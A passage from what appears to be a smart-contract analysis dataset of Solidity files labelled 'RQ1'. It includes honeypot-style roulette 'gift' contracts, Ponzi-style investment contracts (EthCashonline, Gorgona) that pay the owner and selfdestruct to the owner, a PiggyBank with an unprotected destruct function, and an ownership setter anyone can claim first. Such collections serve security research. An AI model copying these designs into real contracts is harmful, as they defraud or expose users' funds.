        _transfer(msg.sender, _to, _value);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
    uint256 public sellPrice;
    uint256 public buyPrice;
    function setPrices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner {
        sellPrice = newSellPrice;
        buyPrice = newBuyPrice;
    }
    function buy() payable returns (uint amount){
        amount = msg.value / buyPrice;                    
        require(balanceOf[this] >= amount);               
        balanceOf[msg.sender] += amount;                  
        balanceOf[this] -= amount;                        
        Transfer(this, msg.sender, amount);               
        return amount;                                    
    }
    function sell(uint amount) returns (uint revenue){
        require(balanceOf[msg.sender] >= amount);         
        balanceOf[this] += amount;                        
        balanceOf[msg.sender] -= amount;                  
        revenue = amount * sellPrice;
        msg.sender.transfer(revenue);                     
        Transfer(msg.sender, this, amount);               
        return revenue;                                   
    }
    uint minBalanceForAccounts;
    function setMinBalance(uint minimumBalanceInFinney) onlyOwner {
         minBalanceForAccounts = minimumBalanceInFinney * 1 finney;
    }
}
```

## RQ1_5ef9f46acd2e

文件 `units/program.sol`；SHA256 `e43ef70b2d9d4676028d671644a52a7a080ff8398e70c0683537e639b35ae399`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
contract PiggyBank  {
  string public name;
  string public symbol = '%';
  uint8 constant public decimals = 18;
  uint256 constant internal denominator = 10 ** uint256(decimals);
  uint256 internal targetAmount;
  address internal targetAddress;
  constructor(
    string goalName,
    uint256 goalAmount
  ) public
  {
    name = goalName;
    targetAmount = goalAmount;
    targetAddress = msg.sender;
  }
  function balanceOf() view public returns(uint256)
  {
    return 100 * address(this).balance / targetAmount;
  }
  event Transfer(address indexed from, address indexed to, uint256 value);
  function () public payable {
    if (balanceOf() >= 100) {
      selfdestruct(targetAddress);
    }
  }
  function debugDestruct() public {
    selfdestruct(targetAddress);
  }
}
```

## RQ1_7623b2a26a25

文件 `units/program.sol`；SHA256 `fcaaa9deb9c394ad84645fa5a627160af65113bd2cd44d7f6194ea6b357c376f`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.20;
contract TestingR
{
    uint8 public result = 0;
    bool finished = false;
    address rouletteOwner;
    function Play(uint8 _number)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(result == _number && msg.value>0.01 ether && !finished)
        {
            msg.sender.transfer(this.balance);
            GiftHasBeenSent();
        }
    }
    function StartRoulette(uint8 _number)
    public
    payable
    {
        if(result==0)
        {
            result = _number;
            rouletteOwner = msg.sender;
        }
    }
    function StopGame(uint8 _number)
    public
    payable
    {
        require(msg.sender == rouletteOwner);
        GiftHasBeenSent();
        result = _number;
        if (msg.value>0.008 ether){
            selfdestruct(rouletteOwner);
        }
    }
    function GiftHasBeenSent()
    private
    {
        finished = true;
    }
    function() public payable{}
}
```

## RQ1_771e49570272

文件 `units/program.sol`；SHA256 `033dd0b16010541fde66d11d352b4f693dc2223872282d9aa52f20708d7d0c5c`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.20;
contract TestR
{
    uint8 public result = 0;
    bool finished = false;
    address rouletteOwner;
    function Play(uint8 _number)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(result == _number && msg.value>0.5 ether && !finished)
        {
            msg.sender.transfer(this.balance);
            GiftHasBeenSent();
        }
    }
    function StartRoulette(uint8 _number)
    public
    payable
    {
        if(result==0)
        {
            result = _number;
            rouletteOwner = msg.sender;
        }
    }
    function StopGame(uint8 _number)
    public
    payable
    {
        require(msg.sender == rouletteOwner);
        GiftHasBeenSent();
        result = _number;
        if (msg.value>0.08 ether){
            selfdestruct(rouletteOwner);
        }
    }
    function GiftHasBeenSent()
    private
    {
        finished = true;
    }
    function() public payable{}
}
```

## RQ1_999f460049c5

文件 `units/program.sol`；SHA256 `e4cbf2de3a93ea42eadb49098d7701239e3119464f95cc37a87a0687d8572c31`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.20;
contract R
{
    uint8 public result = 0;
    bool public finished = false;
    address public rouletteOwner;
    function Play(uint8 _number)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(result == _number && msg.value>0.001 ether && !finished)
        {
            msg.sender.transfer(this.balance);
            GiftHasBeenSent();
        }
    }
    function StartRoulette(uint8 _number)
    public
    payable
    {
        if(result==0)
        {
            result = _number;
            rouletteOwner = msg.sender;
        }
    }
    function StopGame(uint8 _number)
    public
    payable
    {
        require(msg.sender == rouletteOwner);
        GiftHasBeenSent();
        result = _number;
        if (msg.value>0.001 ether){
            selfdestruct(rouletteOwner);
        }
    }
    function GiftHasBeenSent()
    private
    {
        finished = true;
    }
    function() public payable{}
}
```

## RQ1_ad8d0ac6a104

文件 `units/program.sol`；SHA256 `10fa1891e39411f2feb509d2c47356c2aec671a74067ec4e2d8dade088b0b8e0`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.18;
contract Proxy {
  function implementation() public view returns (address);
  function () payable public {
    address impl = implementation();
    require(impl != address(0));
    bytes memory data = msg.data;
    assembly {
      let result := delegatecall(gas, impl, add(data, 0x20), mload(data), 0, 0)
      let size := returndatasize
      let ptr := mload(0x40)
      returndatacopy(ptr, 0, size)
      switch result
      case 0 { revert(ptr, size) }
      default { return(ptr, size) }
    }
  }
}
contract Ownable {
  address[] public owners;
  event OwnerAdded(address indexed authorizer, address indexed newOwner, uint256 index);
  event OwnerRemoved(address indexed authorizer, address indexed oldOwner);
  function Ownable() public {
    owners.push(msg.sender);
    OwnerAdded(0x0, msg.sender, 0);
  }
  modifier onlyOwner() {
    bool isOwner = false;
    for (uint256 i = 0; i < owners.length; i++) {
      if (msg.sender == owners[i]) {
        isOwner = true;
        break;
      }
    }
    require(isOwner);
    _;
  }
  function addOwner(address newOwner) onlyOwner public {
    require(newOwner != address(0));
    uint256 i = owners.push(newOwner) - 1;
    OwnerAdded(msg.sender, newOwner, i);
  }
  function removeOwner(uint256 index) onlyOwner public {
    address owner = owners[index];
    owners[index] = owners[owners.length - 1];
    delete owners[owners.length - 1];
    OwnerRemoved(msg.sender, owner);
  }
  function ownersCount() constant public returns (uint256) {
    return owners.length;
  }
}
contract UpgradableStorage is Ownable {
  address internal _implementation;
  event NewImplementation(address implementation);
  function implementation() public view returns (address) {
    return _implementation;
  }
}
contract Upgradable is UpgradableStorage {
  function initialize() public payable { }
}
contract KnowledgeProxy is Proxy, UpgradableStorage {
  function upgradeTo(address imp) onlyOwner public payable {
    _implementation = imp;
    Upgradable(this).initialize.value(msg.value)();
    NewImplementation(imp);
  }
}
```

## RQ1_b6fc6e31e760

文件 `units/program.sol`；SHA256 `73d8428a48c112a296f63bbcdb3a49d0e0acff491217c70d4831b51e944a3f3e`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if(a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b != 0);
        return a % b;
    }
}
contract Ownable {
    address private _owner;
    event OwnershipRenounced(address indexed previousOwner);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() { require(isOwner()); _; }
    constructor() public {
        _owner = msg.sender;
    }
    function owner() public view returns(address) {
        return _owner;
    }
    function isOwner() public view returns(bool) {
        return msg.sender == _owner;
    }
    function renounceOwnership() public onlyOwner {
        _owner = address(0);
        emit OwnershipRenounced(_owner);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        _owner = newOwner;
        emit OwnershipTransferred(_owner, newOwner);
    }
}
contract EthCashonline is Ownable {
    using SafeMath for uint;
    struct Investor {
        uint id;
        uint deposit;
        uint deposits;
        uint date;
        address referrer;
    }
    uint private MIN_INVEST = 0.03 ether;
    uint private OWN_COMMISSION_PERCENT = 12;
    uint private REF_BONUS_PERCENT = 7;
    uint private CASHBACK_PERCENT = 35;
    uint private PAYOUT_INTERVAL = 1 minutes; 
    uint private PAYOUT_SELF_INTERVAL = 30 minutes;
    uint private INTEREST = 15;
    uint public depositAmount;
    uint public payoutDate;
    uint public paymentDate;
    address[] public addresses;
    mapping(address => Investor) public investors;
    event Invest(address holder, uint amount);
    event ReferrerBonus(address holder, uint amount);
    event Cashback(address holder, uint amount);
    event PayoutCumulative(uint amount, uint txs);
    event PayoutSelf(address addr, uint amount);
    constructor() public {
        payoutDate = now;
    }
    function() payable public {
        if (0 == msg.value) {
            payoutSelf();
            return;
        }
        require(msg.value >= MIN_INVEST, "Too small amount");
        Investor storage user = investors[msg.sender];
        if(user.id == 0) {
            user.id = addresses.length + 1;
            addresses.push(msg.sender);
            address ref = bytesToAddress(msg.data);
            if(investors[ref].deposit > 0 && ref != msg.sender) {
                user.referrer = ref;
            }
        }
        user.deposit = user.deposit.add(msg.value);
        user.deposits = user.deposits.add(1);
        user.date = now;
        emit Invest(msg.sender, msg.value);
        paymentDate = now;
        depositAmount = depositAmount.add(msg.value);
        uint own_com = msg.value.div(100).mul(OWN_COMMISSION_PERCENT);
        owner().transfer(own_com);
        if(user.referrer != address(0)) {
            uint bonus = msg.value.div(100).mul(REF_BONUS_PERCENT);
            user.referrer.transfer(bonus);
            emit ReferrerBonus(user.referrer, bonus);
            if(user.deposits == 1) {
                uint cashback = msg.value.div(1000).mul(CASHBACK_PERCENT);
                msg.sender.transfer(cashback);
                emit Cashback(msg.sender, cashback);
            }
        }
    }
    function payout(uint limit) public {
        require(now >= payoutDate + PAYOUT_INTERVAL, "Too fast payout request");
        uint sum;
        uint txs;
        for(uint i = addresses.length ; i > 0; i--) {
            address addr = addresses[i - 1];
            if(investors[addr].date + 24 hours > now) continue;
            uint amount = getInvestorUnPaidAmount(addr);
            investors[addr].date = now;
            if(address(this).balance < amount) {
                selfdestruct(owner());
                return;
            }
            addr.transfer(amount);
            sum = sum.add(amount);
            if(++txs >= limit) break;
        }
        payoutDate = now;
        emit PayoutCumulative(sum, txs);
    }
    function payoutSelf() public {
        address addr = msg.sender;
        require(investors[addr].deposit > 0, "Deposit not found");
        require(now >= investors[addr].date + PAYOUT_SELF_INTERVAL, "Too fast payout request");
        uint amount = getInvestorUnPaidAmount(addr);
        require(amount >= 1 finney, "Too small unpaid amount");
        investors[addr].date = now;
        if(address(this).balance < amount) {
            selfdestruct(owner());
            return;
        }
        addr.transfer(amount);
        emit PayoutSelf(addr, amount);
    }
    function bytesToAddress(bytes bys) private pure returns(address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
    function getInvestorUnPaidAmount(address addr) public view returns(uint) {
        return investors[addr].deposit.div(1000).mul(INTEREST).div(100).mul(now.sub(investors[addr].date).mul(100)).div(1 days);
    }
    function getInvestorCount() public view returns(uint) { return addresses.length; }
}
```

## RQ1_c60bf13e0ef3

文件 `units/program.sol`；SHA256 `8b9783beee9d252712d1f927c6fd3374dafd623b3451b8543846519571754a02`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
contract Gorgona {
    address public owner;
    uint constant PAYOUT_PER_INVESTOR_INTERVAL = 10 minutes;
    uint constant INTEREST = 3;
    uint private PAYOUT_CUMULATIVE_INTERVAL = 10 minutes;
    uint private MINIMUM_INVEST = 10000000000000000 wei;
    uint depositAmount;
    uint investorCount;
    uint public payoutDate;
    uint public lastPaymentDate;
    struct investor
    {
        uint id;
        uint deposit;
        uint deposits;
        uint date;
        address referrer;
    }
    address[] public addresses;
    mapping(address => investor) public investors;
    event Invest(address addr, uint amount);
    event PayoutCumulative(uint amount, uint txs);
    event PayoutSelf(address addr, uint amount);
    event RefFee(address addr, uint amount);
    event Cashback(address addr, uint amount);
    modifier onlyOwner {if (msg.sender == owner) _;}
    constructor() public {
        owner = msg.sender;
        addresses.length = 1;
        payoutDate = now;
    }
    function() payable public {
        if (msg.value == 0) {
            return;
        }
        require(msg.value >= MINIMUM_INVEST, "Too small amount, minimum 0.001 ether");
        investor storage user = investors[msg.sender];
        if (user.id == 0) {
            user.id = addresses.length;
            addresses.push(msg.sender);
            investorCount ++;
            address referrer = bytesToAddress(msg.data);
            if (investors[referrer].deposit > 0 && referrer != msg.sender) {
                user.referrer = referrer;
            }
        }
        user.deposit += msg.value;
        user.deposits += 1;
        user.date = now;
        emit Invest(msg.sender, msg.value);
        depositAmount += msg.value;
        lastPaymentDate = now;
        owner.transfer(msg.value / 5);
        if (user.referrer > 0x0) {
            uint bonusAmount = (msg.value / 100) * INTEREST;
            user.referrer.transfer(bonusAmount);
            emit RefFee(user.referrer, bonusAmount);
            if (user.deposits == 1) {
                msg.sender.transfer(bonusAmount);
                emit Cashback(msg.sender, bonusAmount);
            }
        }
    }
    function payout(uint limit) public
    {
        require(now >= payoutDate + PAYOUT_CUMULATIVE_INTERVAL, "too fast payout request");
        uint investorsPayout;
        uint txs;
        uint amount;
        for (uint idx = addresses.length; --idx >= 1;)
        {
            address addr = addresses[idx];
            if (investors[addr].date + 24 hours > now) {
                continue;
            }
            amount = getInvestorUnPaidAmount(addr);
            investors[addr].date = now;
            if (address(this).balance < amount) {
                selfdestruct(owner);
                return;
            }
            addr.transfer(amount);
            investorsPayout += amount;
            if (++txs >= limit) {
                break;
            }
        }
        payoutDate = now;
        emit PayoutCumulative(investorsPayout, txs);
    }
    function payoutSelf(address addr) public
    {
        require(addr == msg.sender, "You need specify your ETH address");
        require(investors[addr].deposit > 0, "deposit not found");
        require(now >= investors[addr].date + PAYOUT_PER_INVESTOR_INTERVAL, "too fast payment required");
        uint amount = getInvestorUnPaidAmount(addr);
        require(amount >= 1 finney, "too small unpaid amount");
        investors[addr].date = now;
        if (address(this).balance < amount) {
            selfdestruct(owner);
            return;
        }
        addr.transfer(amount);
        emit PayoutSelf(addr, amount);
    }
    function getInvestorDeposit(address addr) public view returns (uint) {
        return investors[addr].deposit;
    }
    function getInvestorCount() public view returns (uint) {
        return investorCount;
    }
    function getDepositAmount() public view returns (uint) {
        return depositAmount;
    }
    function getInvestorDatePayout(address addr) public view returns (uint) {
        return investors[addr].date;
    }
    function getPayoutCumulativeInterval() public view returns (uint)
    {
        return PAYOUT_CUMULATIVE_INTERVAL;
    }
    function setDatePayout(address addr, uint date) onlyOwner public
    {
        investors[addr].date = date;
    }
    function setPayoutCumulativeInterval(uint interval) onlyOwner public
    {
        PAYOUT_CUMULATIVE_INTERVAL = interval;
    }
    function getInvestorUnPaidAmount(address addr) public view returns (uint)
    {
        return (((investors[addr].deposit / 100) * INTEREST) / 100) * ((now - investors[addr].date) * 100) / 1 days;
    }
    function bytesToAddress(bytes bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}
```

## RQ1_d639862f5b71

文件 `units/program.sol`；SHA256 `a9efdfd57b5714e07fbdce139b6a610eba6116e3377bfbdab04b592410c39c45`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.15;
contract ERC20 {
  uint public totalSupply;
  function balanceOf(address who) constant returns (uint);
  function allowance(address owner, address spender) constant returns (uint);
  function transfer(address to, uint value) returns (bool ok);
  function transferFrom(address from, address to, uint value) returns (bool ok);
  function approve(address spender, uint value) returns (bool ok);
  event Transfer(address indexed from, address indexed to, uint value);
  event Approval(address indexed owner, address indexed spender, uint value);
}
contract SafeMath {
    function add(uint256 x, uint256 y) constant internal returns (uint256 z) {
        assert((z = x + y) >= x);
    }
    function sub(uint256 x, uint256 y) constant internal returns (uint256 z) {
        assert((z = x - y) <= x);
    }
    function mul(uint256 x, uint256 y) constant internal returns (uint256 z) {
        assert((z = x * y) >= x);
    }
    function div(uint256 x, uint256 y) constant internal returns (uint256 z) {
        z = x / y;
    }
    function min(uint256 x, uint256 y) constant internal returns (uint256 z) {
        return x <= y ? x : y;
    }
    function max(uint256 x, uint256 y) constant internal returns (uint256 z) {
        return x >= y ? x : y;
    }
}
contract DateTime {
        struct DateTime {
                uint16 year;
                uint8 month;
                uint8 day;
                uint8 hour;
                uint8 minute;
                uint8 second;
                uint8 weekday;
        }
        uint constant DAY_IN_SECONDS = 86400;
        uint constant YEAR_IN_SECONDS = 31536000;
        uint constant LEAP_YEAR_IN_SECONDS = 31622400;
        uint constant HOUR_IN_SECONDS = 3600;
        uint constant MINUTE_IN_SECONDS = 60;
        uint16 constant ORIGIN_YEAR = 1970;
        function isLeapYear(uint16 year) constant returns (bool) {
                if (year % 4 != 0) {
                        return false;
                }
                if (year % 100 != 0) {
                        return true;
                }
                if (year % 400 != 0) {
                        return false;
                }
                return true;
        }
        function leapYearsBefore(uint year) constant returns (uint) {
                year -= 1;
                return year / 4 - year / 100 + year / 400;
        }
        function getDaysInMonth(uint8 month, uint16 year) constant returns (uint8) {
                if (month == 1 || month == 3 || month == 5 || month == 7 || month == 8 || month == 10 || month == 12) {
                        return 31;
                }
                else if (month == 4 || month == 6 || month == 9 || month == 11) {
                        return 30;
                }
                else if (isLeapYear(year)) {
                        return 29;
                }
                else {
                        return 28;
                }
        }
        function parseTimestamp(uint timestamp) internal returns (DateTime dt) {
                uint secondsAccountedFor = 0;
                uint buf;
                uint8 i;
                dt.year = getYear(timestamp);
                buf = leapYearsBefore(dt.year) - leapYearsBefore(ORIGIN_YEAR);
                secondsAccountedFor += LEAP_YEAR_IN_SECONDS * buf;
                secondsAccountedFor += YEAR_IN_SECONDS * (dt.year - ORIGIN_YEAR - buf);
                uint secondsInMonth;
                for (i = 1; i <= 12; i++) {
                        secondsInMonth = DAY_IN_SECONDS * getDaysInMonth(i, dt.year);
                        if (secondsInMonth + secondsAccountedFor > timestamp) {
                                dt.month = i;
                                break;
                        }
                        secondsAccountedFor += secondsInMonth;
                }
                for (i = 1; i <= getDaysInMonth(dt.month, dt.year); i++) {
                        if (DAY_IN_SECONDS + secondsAccountedFor > timestamp) {
                                dt.day = i;
                                break;
                        }
                        secondsAccountedFor += DAY_IN_SECONDS;
                }
                dt.hour = getHour(timestamp);
        }
        function getYear(uint timestamp) constant returns (uint16) {
                uint secondsAccountedFor = 0;
                uint16 year;
                uint numLeapYears;
                year = uint16(ORIGIN_YEAR + timestamp / YEAR_IN_SECONDS);
                numLeapYears = leapYearsBefore(year) - leapYearsBefore(ORIGIN_YEAR);
                secondsAccountedFor += LEAP_YEAR_IN_SECONDS * numLeapYears;
                secondsAccountedFor += YEAR_IN_SECONDS * (year - ORIGIN_YEAR - numLeapYears);
                while (secondsAccountedFor > timestamp) {
                        if (isLeapYear(uint16(year - 1))) {
                                secondsAccountedFor -= LEAP_YEAR_IN_SECONDS;
                        }
                        else {
                                secondsAccountedFor -= YEAR_IN_SECONDS;
                        }
                        year -= 1;
                }
                return year;
        }
        function getMonth(uint timestamp) constant returns (uint8) {
                return parseTimestamp(timestamp).month;
        }
        function getDay(uint timestamp) constant returns (uint8) {
                return parseTimestamp(timestamp).day;
        }
        function getHour(uint timestamp) constant returns (uint8) {
                return uint8((timestamp / 60 / 60) % 24);
        }
}
contract ITGTokenBase is ERC20, SafeMath {
  mapping(address => uint) balances;
  mapping (address => mapping (address => uint)) allowed;
  function balanceOf(address _owner) constant returns (uint balance) {
    return balances[_owner];
  }
  function approve(address _spender, uint _value) returns (bool success) {
    if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }
  function allowance(address _owner, address _spender) constant returns (uint remaining) {
    return allowed[_owner][_spender];
  }
}
contract Authable {
    address public owner;
    address public executor;
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    modifier onlyAuth(){
        require(msg.sender == owner || msg.sender == executor);
        _;
    }
    function setOwner(address _owner){
        require(owner == 0x0 || owner == msg.sender);
        owner = _owner;
    }
    function setExecutor(address exec) {
        require(executor == 0x0 || owner == msg.sender || executor == msg.sender);
        executor = exec;
    }
}
contract CrowdSale is SafeMath, Authable {
    struct SaleAttr{
        uint amountRaisedTotal;  
        uint saleSupplyPre; 
        uint saleSupply1; 
        uint saleSupply2; 
        uint saleSupply3; 
        uint saleSupply4; 
        uint amountRaisedPre;   
        uint amountRaised1;     
        uint amountRaised2;     
        uint amountRaised3;     
        uint amountRaised4;     
        uint soldSupply2;
        uint soldSupply4;
    }
    SaleAttr public s;
    mapping(address => uint) public participantsForPreSale;    
    mapping(address => uint) public participantsFor1stSale;    
    mapping(address => uint) public participantsFor3rdSale;    
    event LogCustomSale(uint startTime, uint endTime, uint tokPerEth, uint supply);
    struct SaleTimeAttr{
        uint pstart;
        uint pdeadline;
        uint start;         
        uint deadline1;     
        uint deadline2;     
        uint deadline3;     
        uint deadline4;     
    }
    SaleTimeAttr public t;
    struct CustomSaleAttr{
        uint start;
        uint end;
        uint tokenPerEth;   
        uint saleSupply;
        uint soldSupply;
        uint amountRaised;
    }
    CustomSaleAttr public cs;
    mapping(uint => mapping(address => uint)) public participantsForCustomSale;
    function setAttrs(uint supplyPre, uint supply1, uint supply2, uint supply3, uint supply4
            , uint preStart, uint preEnd, uint start, uint end1, uint end2, uint end3, uint end4
        ) onlyAuth {
        s.saleSupplyPre = supplyPre; 
        s.saleSupply1 = supply1;    
        s.saleSupply2 = supply2;    
        s.saleSupply3 = supply3;    
        s.saleSupply4 = supply4;    
        t.pstart = preStart;
        t.pdeadline = preEnd;
        t.start = start;
        t.deadline1 = end1;
        t.deadline2 = end2;
        t.deadline3 = end3;
        t.deadline4 = end4;
    }
    function setAttrCustom(uint startTime, uint endTime, uint tokPerEth, uint supply) onlyAuth {
        cs.start = startTime;
        cs.end = endTime;
        cs.tokenPerEth = tokPerEth;
        cs.saleSupply = supply;
        cs.soldSupply = 0;
        cs.amountRaised = 0;
        LogCustomSale(startTime, endTime, tokPerEth, supply);
    }
    function process(address sender, uint sendValue) onlyOwner returns (uint tokenAmount) {
        if(now > t.pstart && now <= t.pdeadline){
            participantsForPreSale[sender] = add(participantsForPreSale[sender],sendValue);
            s.amountRaisedPre = add(s.amountRaisedPre, sendValue);
        }else if(now > t.start && now <= t.deadline1){
            participantsFor1stSale[sender] = add(participantsFor1stSale[sender],sendValue);
            s.amountRaised1 = add(s.amountRaised1, sendValue);
        }else if(now > t.deadline1 && now <= t.deadline2 && s.soldSupply2 < s.saleSupply2){
            tokenAmount = sendValue / (s.amountRaised1 / s.saleSupply1 * 120 / 100);    
            s.soldSupply2 = add(s.soldSupply2, tokenAmount);
            s.amountRaised2 = add(s.amountRaised2, sendValue);
            require(s.soldSupply2 < s.saleSupply2 * 105 / 100);   
        }else if(now > t.deadline2 && now <= t.deadline3){
            participantsFor3rdSale[sender] = add(participantsFor3rdSale[sender],sendValue);
            s.amountRaised3 = add(s.amountRaised3, sendValue);
        }else if(now > t.deadline3 && now <= t.deadline4 && s.soldSupply4 < s.saleSupply4){
            tokenAmount = sendValue / (s.amountRaised3 / s.saleSupply3 * 120 / 100);     
            s.soldSupply4 = add(s.soldSupply4, tokenAmount);
            s.amountRaised4 = add(s.amountRaised4, sendValue);
            require(s.soldSupply4 < s.saleSupply4 * 105 / 100);   
        }else if(now > cs.start && now <= cs.end && cs.soldSupply < cs.saleSupply){
            if(cs.tokenPerEth > 0){
                tokenAmount = sendValue * cs.tokenPerEth;
                cs.soldSupply = add(cs.soldSupply, tokenAmount);
                require(cs.soldSupply < cs.saleSupply * 105 / 100); 
            }else{
                participantsForCustomSale[cs.start][sender] = add(participantsForCustomSale[cs.start][sender],sendValue);
                cs.amountRaised = add(cs.amountRaised, sendValue);
            }
        }else{
            throw;
        }
        s.amountRaisedTotal = add(s.amountRaisedTotal, sendValue);
    }
    function getToken(address sender) onlyOwner returns (uint tokenAmount){
        if(now > t.pdeadline && participantsForPreSale[sender] != 0){
            tokenAmount = add(tokenAmount,participantsForPreSale[sender] * s.saleSupplyPre / s.amountRaisedPre);  
            participantsForPreSale[sender] = 0;
        }
        if(now > t.deadline1 && participantsFor1stSale[sender] != 0){
            tokenAmount = add(tokenAmount,participantsFor1stSale[sender] * s.saleSupply1 / s.amountRaised1);  
            participantsFor1stSale[sender] = 0;
        }
        if(now > t.deadline3 && participantsFor3rdSale[sender] != 0){
            tokenAmount = add(tokenAmount,participantsFor3rdSale[sender] * s.saleSupply3 / s.amountRaised3);  
            participantsFor3rdSale[sender] = 0;
        }
        if(now > cs.end && participantsForCustomSale[cs.start][sender] != 0){
            tokenAmount = add(tokenAmount,participantsForCustomSale[cs.start][sender] * cs.saleSupply / cs.amountRaised);  
            participantsForCustomSale[cs.start][sender] = 0;
        }
    }
}
contract Voting is SafeMath, Authable {
    mapping(uint => uint) public voteRewardPerUnit; 
    mapping(uint => uint) public voteWeightUnit;    
    mapping(uint => uint) public voteStart;
    mapping(uint => uint) public voteEnd;
    mapping(uint => uint) public maxCandidateId;
    mapping(uint => mapping(address => bool)) public voted;
    mapping(uint => mapping(uint => uint)) public results;
    event LogVoteInitiate(uint _voteId, uint _voteRewardPerUnit, uint _voteWeightUnit, uint _voteStart, uint _voteEnd, uint _maxCandidateId);
    event LogVote(address voter, uint weight, uint voteId, uint candidateId, uint candidateValue);
    function voteInitiate(uint _voteId, uint _voteRewardPerUnit, uint _voteWeightUnit, uint _voteStart, uint _voteEnd, uint _maxCandidateId) onlyOwner {   
        require(voteEnd[_voteId] == 0);  
        require(_voteEnd != 0);
        voteRewardPerUnit[_voteId] = _voteRewardPerUnit;
        voteWeightUnit[_voteId] = _voteWeightUnit;
        voteStart[_voteId] = _voteStart;
        voteEnd[_voteId] = _voteEnd;
        maxCandidateId[_voteId] = _maxCandidateId;
        LogVoteInitiate(_voteId, _voteRewardPerUnit, _voteWeightUnit, _voteStart, _voteEnd, _maxCandidateId);
    }
     function vote(address sender, uint holding, uint voteId, uint candidateId) onlyOwner returns (uint tokenAmount, uint lockUntil){
        require(now > voteStart[voteId] && now <= voteEnd[voteId]);
        require(maxCandidateId[voteId] >= candidateId);
        require(holding >= voteRewardPerUnit[voteId]);
        require(!voted[voteId][sender]);
        uint weight = holding / voteWeightUnit[voteId];
        results[voteId][candidateId] = add(results[voteId][candidateId], weight);
        voted[voteId][sender] = true;
        tokenAmount = weight * voteWeightUnit[voteId] * voteRewardPerUnit[voteId] / 100 / 100;
        lockUntil = voteEnd[voteId];
        LogVote(sender, weight, voteId, candidateId, results[voteId][candidateId]);
    }
}
contract Games is SafeMath, DateTime, Authable {
    enum GameTime { Hour, Month, Year, OutOfTime }
    enum GameType { Range, Point}
    struct Participant {
        address sender;
        uint value;
        uint currency; 
    }
    struct DateAttr{
        uint currentYear;
        uint gameStart; 
        uint gameEnd;   
        uint prevGameEnd; 
    }
    DateAttr public d;
    struct CommonAttr{
        GameTime currentGameTimeType;      
        GameType gameType;
        uint hourlyAmountEth;  
        uint monthlyAmountEth;
        uint yearlyAmountEth;
        uint charityAmountEth;
    }
    CommonAttr public c;
    struct FundAmountStatusAttr{
        uint hourlyStatusEth;  
        uint monthlyStatusEth;
        uint yearlyStatusEth;
        uint hourlyStatusTok;  
        uint monthlyStatusTok;
    }
    FundAmountStatusAttr public f;
    struct PriceAttr{
        uint bonusPerEth;   
        uint inGameTokPricePerEth;   
        uint inGameTokWinRatioMax;   
        uint inGameTokWinRatioMin;
        uint currentInGameTokWinRatio;  
        uint hourlyMinParticipateRatio;     
        uint monthlyMinParticipateRatio;    
        uint yearlyMinParticipateRatio;     
        uint boostPrizeEth;    
    }
    PriceAttr public p;
    struct RangeGameAttr{
        uint inTimeRange_H; 
        uint inTimeRange_M;
        uint inTimeRange_Y;
    }
    RangeGameAttr public r;
    Participant[] public participants;  
    mapping(uint256 => mapping(address => uint256)) public winners; 
    mapping(uint256 => mapping(address => uint256)) public tokTakers; 
    mapping(uint256 => uint256) public winPrizes;
    mapping(uint256 => uint256) public tokPrizes;
    event LogSelectWinner(uint rand, uint luckyNumber, address sender, uint reward, uint currency, uint amount);
    function setPriceAttr(
            GameType _gameType, uint _bonusPerEth, uint _inGameTokPricePerEth
            , uint _inGameTokWinRatioMax, uint _inGameTokWinRatioMin, uint _currentInGameTokWinRatio
            , uint _hourlyMinParticipateRatio, uint _monthlyMinParticipateRatio, uint _yearlyMinParticipateRatio, uint _boostPrizeEth
        ) onlyAuth {
        c.gameType = _gameType;
        p.bonusPerEth = _bonusPerEth;   
        p.inGameTokPricePerEth = _inGameTokPricePerEth; 
        p.inGameTokWinRatioMax = _inGameTokWinRatioMax; 
        p.inGameTokWinRatioMin = _inGameTokWinRatioMin; 
        p.currentInGameTokWinRatio = _currentInGameTokWinRatio;    
        p.hourlyMinParticipateRatio = _hourlyMinParticipateRatio;   
        p.monthlyMinParticipateRatio = _monthlyMinParticipateRatio; 
        p.yearlyMinParticipateRatio = _yearlyMinParticipateRatio;   
        p.boostPrizeEth = _boostPrizeEth;   
    }
    function setRangeGameAttr(uint _inTimeRange_H, uint _inTimeRange_M, uint _inTimeRange_Y) onlyAuth {
        r.inTimeRange_H = _inTimeRange_H;   
        r.inTimeRange_M = _inTimeRange_M;   
